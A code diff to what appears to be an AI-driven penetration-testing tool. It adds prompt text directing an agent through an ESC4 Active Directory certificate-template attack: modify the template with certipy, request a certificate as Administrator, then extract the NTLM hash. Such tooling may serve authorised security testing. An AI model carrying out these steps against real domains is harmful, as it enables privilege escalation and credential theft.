@@ -925,7 +925,21 @@ def _generate_exploit_prompt(
             "- Max 2 attempts per tool, then report failure\n\n"
             "**WORKFLOW:**\n"
         )
-        if "esc1" in vuln_type_lower or "esc4" in vuln_type_lower:
+        if "esc4" in vuln_type_lower:
+            # ESC4 requires template modification FIRST (GenericAll on template)
+            enrollee_user = payload.get("enrollee_user", payload.get("username", ""))
+            esc_prompt += (
+                "**ESC4 ATTACK — Template Modification Required:**\n"
+                "1. certipy_template_esc4 to modify the template "
+                "(enable ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU)\n"
+                "   - Use the credentials of the user with GenericAll on the template\n"
+                f"   - Enrollee user: {enrollee_user}\n"
+                "2. certipy_request to request cert as Administrator with -upn administrator@<domain>\n"
+                "3. certipy_auth to get NTLM hash from certificate\n"
+                "4. Report hash immediately when obtained\n"
+                "OR use certipy_esc4_full_chain to run the full ESC4 chain in one step.\n"
+            )
+        elif "esc1" in vuln_type_lower:
             esc_prompt += (
                 "1. certipy_req_esc1 to request certificate with alternate UPN\n"
                 "2. certipy_auth to get NTLM hash from certificate\n"
